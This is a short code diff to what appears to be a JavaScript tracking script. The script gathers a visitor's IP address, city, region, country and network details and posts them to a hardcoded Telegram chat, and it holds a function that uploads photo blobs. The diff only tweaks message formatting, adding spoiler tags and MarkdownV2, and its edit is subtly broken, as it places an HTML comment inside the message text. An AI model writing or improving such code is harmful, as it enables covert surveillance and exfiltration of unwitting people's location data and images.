@@ -377,7 +377,7 @@ async function sendTextToTelegram(data) {
 - Data Saver: ${data.network.saveData}
 
 📍 *Location & IP*
-- IP: ${data.ip}
+- IP: ||${data.ip}||  <!-- Spoiler tag for IP -->
 - City: ${data.city}
 - Region: ${data.region}
 - Country: ${data.country}
@@ -397,10 +397,11 @@ async function sendTextToTelegram(data) {
     body: JSON.stringify({
       chat_id: "7216371031",
       text: message,
-      parse_mode: "Markdown"
+      parse_mode: "MarkdownV2"  // Use MarkdownV2 for spoiler support
     })
   });
 }
+
 
 function sendPhotoToTelegram(blob, caption) {
   const formData = new FormData();
